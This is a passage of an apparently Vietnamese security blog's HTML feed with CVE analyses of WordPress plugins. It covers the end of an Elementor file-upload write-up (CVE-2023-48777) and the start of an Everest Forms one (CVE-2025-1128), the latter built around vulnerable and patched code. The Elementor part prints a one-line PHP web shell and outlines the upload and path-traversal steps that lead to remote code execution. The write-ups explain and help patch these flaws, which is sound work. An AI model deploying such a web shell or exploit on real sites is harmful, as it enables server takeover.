0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o JSON file ch·ª©a web shell&#xA;PHP&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;])?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload v√† b·∫Øt request b·∫±ng BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠a ƒë·ªïi file extension th√†nh PHP k·∫øt h·ª£p path traversal v√† g·ª≠i request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/request.png&#34; title=&#34;Request v·ªõi path traversal v√† .php&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request v·ªõi path traversal v√† .php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/request.png&#39; alt=&#34;Request&#34; height=&#34;850&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request v·ªõi path traversal v√† .php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;K·∫øt qu·∫£&lt;/strong&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/result.png&#39; alt=&#34;Result&#34; height=&#34;571&#34; width=&#34;1578&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2023-48777&lt;/strong&gt; cho ph√©p ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; t·∫£i l√™n c√°c file ƒë·ªôc h·∫°i do thi·∫øu ki·ªÉm tra lo·∫°i file tr∆∞·ªõc khi l∆∞u tr·ªØ. ƒêi·ªÅu n√†y c√≥ th·ªÉ d·∫´n ƒë·∫øn &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; v√† &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; n·∫øu m√°y ch·ªß cho ph√©p th·ª±c thi file upload. L·ªói ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n &lt;strong&gt;3.18.2&lt;/strong&gt; b·∫±ng c√°ch b·ªï sung ki·ªÉm tra ph·∫ßn m·ªü r·ªông file h·ª£p l·ªá tr∆∞·ªõc khi ghi ra ƒëƒ©a.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;x√°c th·ª±c lo·∫°i file tr∆∞·ªõc khi l∆∞u&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng tin t∆∞·ªüng d·ªØ li·ªáu Base64 ho·∫∑c t√™n file&lt;/strong&gt; t·ª´ client.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·ªõi h·∫°n quy·ªÅn upload&lt;/strong&gt; v√† t√°ch bi·ªát th∆∞ m·ª•c l∆∞u file kh·ªèi v√πng th·ª±c thi m√£.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elementor/vulnerability/wordpress-elementor-plugin-3-18-0-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin &amp;lt;= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-1128 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-09-cve-2025-1128/</link>
      <pubDate>Sun, 09 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-09-cve-2025-1128/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Everest Forms ‚Äì Contact Forms, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; d·ªÖ b·ªã t·∫•n c√¥ng &lt;strong&gt;arbitrary file upload, read, and deletion&lt;/strong&gt; do thi·∫øu &lt;strong&gt;file type&lt;/strong&gt; v√† &lt;strong&gt;path validation&lt;/strong&gt; trong ph∆∞∆°ng th·ª©c &lt;code&gt;format&lt;/code&gt; c·ªßa class &lt;code&gt;EVF_Form_Fields_Upload&lt;/code&gt; ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;3.0.9.4&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;upload, read, v√† delete arbitrary files&lt;/strong&gt; tr√™n server c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, d·∫´n ƒë·∫øn kh·∫£ nƒÉng &lt;strong&gt;remote code execution&lt;/strong&gt;, &lt;strong&gt;sensitive information disclosure&lt;/strong&gt;, ho·∫∑c &lt;strong&gt;site takeover&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-1128&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-1128&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.0.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.0.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.0.9.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.0.9.5&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng n√†y do vi·ªác ki·ªÉm tra ki·ªÉu t·ªáp v√† ƒë∆∞·ªùng d·∫´n t·ªáp ch∆∞a ƒë·ªß nghi√™m ng·∫∑t trong h√†m &lt;code&gt;format&lt;/code&gt; c·ªßa l·ªõp &lt;code&gt;EVF _Form_Fields_Upload&lt;/code&gt;. Ngay c·∫£ khi t·ªáp c√≥ ƒë·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá, qu√° tr√¨nh t·∫£i l√™n v·∫´n c√≥ th·ªÉ th√†nh c√¥ng, n√™n b·∫±ng c√°ch s·ª≠a m·ªôt v√†i n·ªôi dung trong d·ªØ li·ªáu/giao ti·∫øp g·ª≠i l√™n, c√≥ th·ªÉ n√© ƒë∆∞·ª£c vi·ªác x√°c th·ª±c ph√≠a m√°y ch·ªß.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    ...&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;    if ( $proper_filename || ! $ext || ! $type ) {&#xA;        evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;        update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // upload file handler&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ &lt;code&gt;$ext&lt;/code&gt; v√† &lt;code&gt;$type&lt;/code&gt; &lt;strong&gt;r·ªóng&lt;/strong&gt; n·∫øu file upload kh√¥ng h·ª£p l·ªá (kh√¥ng n·∫±m trong &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;whilelist&lt;/a&gt; c·ªßa WordPress).&lt;/p&gt;&#xA;&lt;p&gt;Sau khi d√≤ng &lt;code&gt;8-9&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi, kh√¥ng c√≥ c∆° ch·∫ø n√†o ƒë·ªÉ d·ª´ng ch∆∞∆°ng tr√¨nh khi·∫øn ch∆∞∆°ng tr√¨nh ti·∫øp t·ª•c th·ª±c thi upload file.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ th·ª±c hi·ªán ƒëi·ªÅu n√†y b·∫±ng c√°ch g·ªçi h√†m &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_die/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;wp_die()&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    ...&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;    if ( $proper_filename || ! $ext || ! $type ) {&#xA;        evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;        update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;        wp_die( &amp;#39;File type is not allowed&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // upload file handler&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    // Setup class properties to reuse everywhere.&#xA;    $this-&amp;gt;form_data  = (array) $form_data;&#xA;    $this-&amp;gt;form_id    = absint( $this-&amp;gt;form_data[&amp;#39;id&amp;#39;] );&#xA;    $this-&amp;gt;field_id   = $field_id;&#xA;    $this-&amp;gt;field_data = $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ];&#xA;&#xA;    $field_label = ! empty( $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ][&amp;#39;label&amp;#39;] ) ? $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ][&amp;#39;label&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $input_name  = sprintf( &amp;#39;everest_forms_%d_%s&amp;#39;, $this-&amp;gt;form_id, $this-&amp;gt;field_id );&#xA;    // Make sure json_decode() doesn&amp;#39;t fail on newer PHP.&#xA;    try {&#xA;        $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security&#xA;    } catch ( Exception $e ) {&#xA;        evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;        return;&#xA;    }&#xA;&#xA;    // Make sure we process only submitted files with the expected structure and keys.&#xA;    $files = array_filter(&#xA;        $raw_files,&#xA;        static function ( $file ) {&#xA;            return ( is_array( $file ) || is_object( $file ) &amp;amp;&amp;amp; count( $file ) === 2 ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;file&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;name&amp;#39;] );&#xA;        }&#xA;    );&#xA;&#xA;    if ( empty( $files ) ) {&#xA;        evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;        return;&#xA;    }&#xA;&#xA;    $data = array();&#xA;&#xA;    foreach ( $files as $file ) {&#xA;        $file = $this-&amp;gt;generate_file_info( $file );&#xA;&#xA;        $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;&#xA;        $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;        $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;        $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;&#xA;        if ( $proper_filename || ! $ext || ! $type ) {&#xA;            evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;            update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;        }&#xA;&#xA;        // Allow third-party integrations.&#xA;        if ( has_filter( &amp;#39;everest_forms_integration_uploads&amp;#39; ) ) {&#xA;            $file = apply_filters( &amp;#39;everest_forms_integration_uploads&amp;#39;, $file, $this-&amp;gt;form_data );&#xA;        }&#xA;&#xA;        if ( $this-&amp;gt;is_media_integrated() ) {&#xA;            $file[&amp;#39;path&amp;#39;] = $file[&amp;#39;tmp_path&amp;#39;];&#xA;&#xA;            $file = $this-&amp;gt;generate_file_attachment( $file );&#xA;        } elseif (&#xA;                ! isset( $file[&amp;#39;external&amp;#39;] )&#xA;                &amp;amp;&amp;amp; file_exists( $file[&amp;#39;tmp_path&amp;#39;] )&#xA;            ) {&#xA;&#xA;                $this-&amp;gt;create_dir( dirname( $file[&amp;#39;path&amp;#39;] ) );&#xA;                @rename( $file[&amp;#39;tmp_path&amp;#39;] , $file[&amp;#39;path&amp;#39;] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged&#xA;                $this-&amp;gt;set_file_fs_permissions( $file[&amp;#39;path&amp;#39;] );&#xA;        }&#xA;&#xA;        $data[] = $this-&amp;gt;generate_file_data( $file );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin n√†y ƒë∆∞·ª£c t·∫°o ra nh·∫±m m·ª•c ƒë·ªãch t·∫°o form template v√† s·ª≠ d·ª•ng ch√∫ng trong post/page. V√¨ l·ªó h·ªïng li√™n quan ƒë·∫øn vi·ªác &lt;strong&gt;upload file&lt;/strong&gt;, n√™n ta t·∫°o form v·ªõi field &lt;strong&gt;File Upload&lt;/strong&gt; v√† nh√∫ng n√≥ v√†o post&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/create_form.png&#34; title=&#34;T·∫°o form 